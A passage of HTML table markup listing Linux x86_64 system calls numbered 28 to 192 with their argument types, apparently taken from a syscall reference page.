align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">28</td><td align="left">sys_madvise</td><td align="left">unsigned long start</td><td align="left">size_t len_in</td><td align="left">int behavior</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">29</td><td align="left">sys_shmget</td><td align="left">key_t key</td><td align="left">size_t size</td><td align="left">int shmflg</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">30</td><td align="left">sys_shmat</td><td align="left">int shmid</td><td align="left">char *shmaddr</td><td align="left">int shmflg</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">31</td><td align="left">sys_shmctl</td><td align="left">int shmid</td><td align="left">int cmd</td><td align="left">struct shmid_ds *buf</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">32</td><td align="left">sys_dup</td><td align="left">unsigned int fildes</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">33</td><td align="left">sys_dup2</td><td align="left">unsigned int oldfd</td><td align="left">unsigned int newfd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">34</td><td align="left">sys_pause</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">35</td><td align="left">sys_nanosleep</td><td align="left">struct timespec *rqtp</td><td align="left">struct timespec *rmtp</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">36</td><td align="left">sys_getitimer</td><td align="left">int which</td><td align="left">struct itimerval *value</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">37</td><td align="left">sys_alarm</td><td align="left">unsigned int seconds</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">38</td><td align="left">sys_setitimer</td><td align="left">int which</td><td align="left">struct itimerval *value</td><td align="left">struct itimerval *ovalue</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">39</td><td align="left">sys_getpid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">40</td><td align="left">sys_sendfile</td><td align="left">int out_fd</td><td align="left">int in_fd</td><td align="left">off_t *offset</td><td align="left">size_t count</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">41</td><td align="left">sys_socket</td><td align="left">int family</td><td align="left">int type</td><td align="left">int protocol</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">42</td><td align="left">sys_connect</td><td align="left">int fd</td><td align="left">struct sockaddr *uservaddr</td><td align="left">int addrlen</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">43</td><td align="left">sys_accept</td><td align="left">int fd</td><td align="left">struct sockaddr *upeer_sockaddr</td><td align="left">int *upeer_addrlen</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">44</td><td align="left">sys_sendto</td><td align="left">int fd</td><td align="left">void *buff</td><td align="left">size_t len</td><td align="left">unsigned flags</td><td align="left">struct sockaddr *addr</td><td align="left">int addr_len</td></tr><tr><td align="left">45</td><td align="left">sys_recvfrom</td><td align="left">int fd</td><td align="left">void *ubuf</td><td align="left">size_t size</td><td align="left">unsigned flags</td><td align="left">struct sockaddr *addr</td><td align="left">int *addr_len</td></tr><tr><td align="left">46</td><td align="left">sys_sendmsg</td><td align="left">int fd</td><td align="left">struct msghdr *msg</td><td align="left">unsigned flags</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">47</td><td align="left">sys_recvmsg</td><td align="left">int fd</td><td align="left">struct msghdr *msg</td><td align="left">unsigned int flags</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">48</td><td align="left">sys_shutdown</td><td align="left">int fd</td><td align="left">int how</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">49</td><td align="left">sys_bind</td><td align="left">int fd</td><td align="left">struct sokaddr *umyaddr</td><td align="left">int addrlen</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">50</td><td align="left">sys_listen</td><td align="left">int fd</td><td align="left">int backlog</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">51</td><td align="left">sys_getsockname</td><td align="left">int fd</td><td align="left">struct sockaddr *usockaddr</td><td align="left">int *usockaddr_len</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">52</td><td align="left">sys_getpeername</td><td align="left">int fd</td><td align="left">struct sockaddr *usockaddr</td><td align="left">int *usockaddr_len</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">53</td><td align="left">sys_socketpair</td><td align="left">int family</td><td align="left">int type</td><td align="left">int protocol</td><td align="left">int *usockvec</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">54</td><td align="left">sys_setsockopt</td><td align="left">int fd</td><td align="left">int level</td><td align="left">int optname</td><td align="left">char *optval</td><td align="left">int optlen</td><td align="left"></td></tr><tr><td align="left">55</td><td align="left">sys_getsockopt</td><td align="left">int fd</td><td align="left">int level</td><td align="left">int optname</td><td align="left">char *optval</td><td align="left">int *optlen</td><td align="left"></td></tr><tr><td align="left">56</td><td align="left">sys_clone</td><td align="left">unsigned long clone_flags</td><td align="left">unsigned long newsp</td><td align="left">void *parent_tid</td><td align="left">void *child_tid</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">57</td><td align="left">sys_fork</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">58</td><td align="left">sys_vfork</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">59</td><td align="left">sys_execve</td><td align="left">const char *filename</td><td align="left">const char *const argv[]</td><td align="left">const char *const envp[]</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">60</td><td align="left">sys_exit</td><td align="left">int error_code</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">61</td><td align="left">sys_wait4</td><td align="left">pid_t upid</td><td align="left">int *stat_addr</td><td align="left">int options</td><td align="left">struct rusage *ru</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">62</td><td align="left">sys_kill</td><td align="left">pid_t pid</td><td align="left">int sig</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">63</td><td align="left">sys_uname</td><td align="left">struct old_utsname *name</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">64</td><td align="left">sys_semget</td><td align="left">key_t key</td><td align="left">int nsems</td><td align="left">int semflg</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">65</td><td align="left">sys_semop</td><td align="left">int semid</td><td align="left">struct sembuf *tsops</td><td align="left">unsigned nsops</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">66</td><td align="left">sys_semctl</td><td align="left">int semid</td><td align="left">int semnum</td><td align="left">int cmd</td><td align="left">union semun arg</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">67</td><td align="left">sys_shmdt</td><td align="left">char *shmaddr</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">68</td><td align="left">sys_msgget</td><td align="left">key_t key</td><td align="left">int msgflg</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">69</td><td align="left">sys_msgsnd</td><td align="left">int msqid</td><td align="left">struct msgbuf *msgp</td><td align="left">size_t msgsz</td><td align="left">int msgflg</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">70</td><td align="left">sys_msgrcv</td><td align="left">int msqid</td><td align="left">struct msgbuf *msgp</td><td align="left">size_t msgsz</td><td align="left">long msgtyp</td><td align="left">int msgflg</td><td align="left"></td></tr><tr><td align="left">71</td><td align="left">sys_msgctl</td><td align="left">int msqid</td><td align="left">int cmd</td><td align="left">struct msqid_ds *buf</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">72</td><td align="left">sys_fcntl</td><td align="left">unsigned int fd</td><td align="left">unsigned int cmd</td><td align="left">unsigned long arg</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">73</td><td align="left">sys_flock</td><td align="left">unsigned int fd</td><td align="left">unsigned int cmd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">74</td><td align="left">sys_fsync</td><td align="left">unsigned int fd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">75</td><td align="left">sys_fdatasync</td><td align="left">unsigned int fd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">76</td><td align="left">sys_truncate</td><td align="left">const char *path</td><td align="left">long length</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">77</td><td align="left">sys_ftruncate</td><td align="left">unsigned int fd</td><td align="left">unsigned long length</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">78</td><td align="left">sys_getdents</td><td align="left">unsigned int fd</td><td align="left">struct linux_dirent *dirent</td><td align="left">unsigned int count</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">79</td><td align="left">sys_getcwd</td><td align="left">char *buf</td><td align="left">unsigned long size</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">80</td><td align="left">sys_chdir</td><td align="left">const char *filename</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">81</td><td align="left">sys_fchdir</td><td align="left">unsigned int fd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">82</td><td align="left">sys_rename</td><td align="left">const char *oldname</td><td align="left">const char *newname</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">83</td><td align="left">sys_mkdir</td><td align="left">const char *pathname</td><td align="left">int mode</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">84</td><td align="left">sys_rmdir</td><td align="left">const char *pathname</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">85</td><td align="left">sys_creat</td><td align="left">const char *pathname</td><td align="left">int mode</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">86</td><td align="left">sys_link</td><td align="left">const char *oldname</td><td align="left">const char *newname</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">87</td><td align="left">sys_unlink</td><td align="left">const char *pathname</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">88</td><td align="left">sys_symlink</td><td align="left">const char *oldname</td><td align="left">const char *newname</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">89</td><td align="left">sys_readlink</td><td align="left">const char *path</td><td align="left">char *buf</td><td align="left">int bufsiz</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">90</td><td align="left">sys_chmod</td><td align="left">const char *filename</td><td align="left">mode_t mode</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">91</td><td align="left">sys_fchmod</td><td align="left">unsigned int fd</td><td align="left">mode_t mode</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">92</td><td align="left">sys_chown</td><td align="left">const char *filename</td><td align="left">uid_t user</td><td align="left">gid_t group</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">93</td><td align="left">sys_fchown</td><td align="left">unsigned int fd</td><td align="left">uid_t user</td><td align="left">gid_t group</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">94</td><td align="left">sys_lchown</td><td align="left">const char *filename</td><td align="left">uid_t user</td><td align="left">gid_t group</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">95</td><td align="left">sys_umask</td><td align="left">int mask</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">96</td><td align="left">sys_gettimeofday</td><td align="left">struct timeval *tv</td><td align="left">struct timezone *tz</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">97</td><td align="left">sys_getrlimit</td><td align="left">unsigned int resource</td><td align="left">struct rlimit *rlim</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">98</td><td align="left">sys_getrusage</td><td align="left">int who</td><td align="left">struct rusage *ru</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">99</td><td align="left">sys_sysinfo</td><td align="left">struct sysinfo *info</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">100</td><td align="left">sys_times</td><td align="left">struct sysinfo *info</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">101</td><td align="left">sys_ptrace</td><td align="left">long request</td><td align="left">long pid</td><td align="left">unsigned long addr</td><td align="left">unsigned long data</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">102</td><td align="left">sys_getuid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">103</td><td align="left">sys_syslog</td><td align="left">int type</td><td align="left">char *buf</td><td align="left">int len</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">104</td><td align="left">sys_getgid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">105</td><td align="left">sys_setuid</td><td align="left">uid_t uid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">106</td><td align="left">sys_setgid</td><td align="left">gid_t gid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">107</td><td align="left">sys_geteuid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">108</td><td align="left">sys_getegid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">109</td><td align="left">sys_setpgid</td><td align="left">pid_t pid</td><td align="left">pid_t pgid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">110</td><td align="left">sys_getppid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">111</td><td align="left">sys_getpgrp</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">112</td><td align="left">sys_setsid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">113</td><td align="left">sys_setreuid</td><td align="left">uid_t ruid</td><td align="left">uid_t euid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">114</td><td align="left">sys_setregid</td><td align="left">gid_t rgid</td><td align="left">gid_t egid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">115</td><td align="left">sys_getgroups</td><td align="left">int gidsetsize</td><td align="left">gid_t *grouplist</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">116</td><td align="left">sys_setgroups</td><td align="left">int gidsetsize</td><td align="left">gid_t *grouplist</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">117</td><td align="left">sys_setresuid</td><td align="left">uid_t *ruid</td><td align="left">uid_t *euid</td><td align="left">uid_t *suid</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">118</td><td align="left">sys_getresuid</td><td align="left">uid_t *ruid</td><td align="left">uid_t *euid</td><td align="left">uid_t *suid</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">119</td><td align="left">sys_setresgid</td><td align="left">gid_t rgid</td><td align="left">gid_t egid</td><td align="left">gid_t sgid</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">120</td><td align="left">sys_getresgid</td><td align="left">gid_t *rgid</td><td align="left">gid_t *egid</td><td align="left">gid_t *sgid</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">121</td><td align="left">sys_getpgid</td><td align="left">pid_t pid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">122</td><td align="left">sys_setfsuid</td><td align="left">uid_t uid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">123</td><td align="left">sys_setfsgid</td><td align="left">gid_t gid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">124</td><td align="left">sys_getsid</td><td align="left">pid_t pid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">125</td><td align="left">sys_capget</td><td align="left">cap_user_header_t header</td><td align="left">cap_user_data_t dataptr</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">126</td><td align="left">sys_capset</td><td align="left">cap_user_header_t header</td><td align="left">const cap_user_data_t data</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">127</td><td align="left">sys_rt_sigpending</td><td align="left">sigset_t *set</td><td align="left">size_t sigsetsize</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">128</td><td align="left">sys_rt_sigtimedwait</td><td align="left">const sigset_t *uthese</td><td align="left">siginfo_t *uinfo</td><td align="left">const struct timespec *uts</td><td align="left">size_t sigsetsize</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">129</td><td align="left">sys_rt_sigqueueinfo</td><td align="left">pid_t pid</td><td align="left">int sig</td><td align="left">siginfo_t *uinfo</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">130</td><td align="left">sys_rt_sigsuspend</td><td align="left">sigset_t *unewset</td><td align="left">size_t sigsetsize</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">131</td><td align="left">sys_sigaltstack</td><td align="left">const stack_t *uss</td><td align="left">stack_t *uoss</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">132</td><td align="left">sys_utime</td><td align="left">char *filename</td><td align="left">struct utimbuf *times</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">133</td><td align="left">sys_mknod</td><td align="left">const char *filename</td><td align="left">umode_t mode</td><td align="left">unsigned dev</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">134</td><td align="left">sys_uselib</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">135</td><td align="left">sys_personality</td><td align="left">unsigned int personality</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">136</td><td align="left">sys_ustat</td><td align="left">unsigned dev</td><td align="left">struct ustat *ubuf</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">137</td><td align="left">sys_statfs</td><td align="left">const char *pathname</td><td align="left">struct statfs *buf</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">138</td><td align="left">sys_fstatfs</td><td align="left">unsigned int fd</td><td align="left">struct statfs *buf</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">139</td><td align="left">sys_sysfs</td><td align="left">int option</td><td align="left">unsigned long arg1</td><td align="left">unsigned long arg2</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">140</td><td align="left">sys_getpriority</td><td align="left">int which</td><td align="left">int who</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">141</td><td align="left">sys_setpriority</td><td align="left">int which</td><td align="left">int who</td><td align="left">int niceval</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">142</td><td align="left">sys_sched_setparam</td><td align="left">pid_t pid</td><td align="left">struct sched_param *param</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">143</td><td align="left">sys_sched_getparam</td><td align="left">pid_t pid</td><td align="left">struct sched_param *param</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">144</td><td align="left">sys_sched_setscheduler</td><td align="left">pid_t pid</td><td align="left">int policy</td><td align="left">struct sched_param *param</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">145</td><td align="left">sys_sched_getscheduler</td><td align="left">pid_t pid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">146</td><td align="left">sys_sched_get_priority_max</td><td align="left">int policy</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">147</td><td align="left">sys_sched_get_priority_min</td><td align="left">int policy</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">148</td><td align="left">sys_sched_rr_get_interval</td><td align="left">pid_t pid</td><td align="left">struct timespec *interval</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">149</td><td align="left">sys_mlock</td><td align="left">unsigned long start</td><td align="left">size_t len</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">150</td><td align="left">sys_munlock</td><td align="left">unsigned long start</td><td align="left">size_t len</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">151</td><td align="left">sys_mlockall</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">152</td><td align="left">sys_munlockall</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">153</td><td align="left">sys_vhangup</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">154</td><td align="left">sys_modify_ldt</td><td align="left">int func</td><td align="left">void *ptr</td><td align="left">unsigned long bytecount</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">155</td><td align="left">sys_pivot_root</td><td align="left">const char *new_root</td><td align="left">const char *put_old</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">156</td><td align="left">sys__sysctl</td><td align="left">struct __sysctl_args *args</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">157</td><td align="left">sys_prctl</td><td align="left">int option</td><td align="left">unsigned long arg2</td><td align="left">unsigned long arg3</td><td align="left">unsigned long arg4</td><td align="left"></td><td align="left">unsigned long arg5</td></tr><tr><td align="left">158</td><td align="left">sys_arch_prctl</td><td align="left">struct task_struct *task</td><td align="left">int code</td><td align="left">unsigned long *addr</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">159</td><td align="left">sys_adjtimex</td><td align="left">struct timex *txc_p</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">160</td><td align="left">sys_setrlimit</td><td align="left">unsigned int resource</td><td align="left">struct rlimit *rlim</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">161</td><td align="left">sys_chroot</td><td align="left">const char *filename</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">162</td><td align="left">sys_sync</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">163</td><td align="left">sys_acct</td><td align="left">const char *name</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">164</td><td align="left">sys_settimeofday</td><td align="left">struct timeval *tv</td><td align="left">struct timezone *tz</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">165</td><td align="left">sys_mount</td><td align="left">char *dev_name</td><td align="left">char *dir_name</td><td align="left">char *type</td><td align="left">unsigned long flags</td><td align="left">void *data</td><td align="left"></td></tr><tr><td align="left">166</td><td align="left">sys_umount2</td><td align="left">const char *target</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">167</td><td align="left">sys_swapon</td><td align="left">const char *specialfile</td><td align="left">int swap_flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">168</td><td align="left">sys_swapoff</td><td align="left">const char *specialfile</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">169</td><td align="left">sys_reboot</td><td align="left">int magic1</td><td align="left">int magic2</td><td align="left">unsigned int cmd</td><td align="left">void *arg</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">170</td><td align="left">sys_sethostname</td><td align="left">char *name</td><td align="left">int len</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">171</td><td align="left">sys_setdomainname</td><td align="left">char *name</td><td align="left">int len</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">172</td><td align="left">sys_iopl</td><td align="left">unsigned int level</td><td align="left">struct pt_regs *regs</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">173</td><td align="left">sys_ioperm</td><td align="left">unsigned long from</td><td align="left">unsigned long num</td><td align="left">int turn_on</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">174</td><td align="left">sys_create_module</td><td align="left">REMOVED IN Linux 2.6</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">175</td><td align="left">sys_init_module</td><td align="left">void *umod</td><td align="left">unsigned long len</td><td align="left">const char *uargs</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">176</td><td align="left">sys_delete_module</td><td align="left">const chat *name_user</td><td align="left">unsigned int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">177</td><td align="left">sys_get_kernel_syms</td><td align="left">REMOVED IN Linux 2.6</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">178</td><td align="left">sys_query_module</td><td align="left">REMOVED IN Linux 2.6</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">179</td><td align="left">sys_quotactl</td><td align="left">unsigned int cmd</td><td align="left">const char *special</td><td align="left">qid_t id</td><td align="left">void *addr</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">180</td><td align="left">sys_nfsservctl</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">181</td><td align="left">sys_getpmsg</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">182</td><td align="left">sys_putpmsg</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">183</td><td align="left">sys_afs_syscall</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">184</td><td align="left">sys_tuxcall</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">185</td><td align="left">sys_security</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">186</td><td align="left">sys_gettid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">187</td><td align="left">sys_readahead</td><td align="left">int fd</td><td align="left">loff_t offset</td><td align="left">size_t count</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">188</td><td align="left">sys_setxattr</td><td align="left">const char *pathname</td><td align="left">const char *name</td><td align="left">const void *value</td><td align="left">size_t size</td><td align="left">int flags</td><td align="left"></td></tr><tr><td align="left">189</td><td align="left">sys_lsetxattr</td><td align="left">const char *pathname</td><td align="left">const char *name</td><td align="left">const void *value</td><td align="left">size_t size</td><td align="left">int flags</td><td align="left"></td></tr><tr><td align="left">190</td><td align="left">sys_fsetxattr</td><td align="left">int fd</td><td align="left">const char *name</td><td align="left">const void *value</td><td align="left">size_t size</td><td align="left">int flags</td><td align="left"></td></tr><tr><td align="left">191</td><td align="left">sys_getxattr</td><td align="left">const char *pathname</td><td align="left">const char *name</td><td align="left">void *value</td><td align="left">size_t size</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">192</td><td align="left">sys_lgetxattr</td><td align="left">const char *pathname</td><td align="left">const char *name</td><td align="left">void *value</td><td 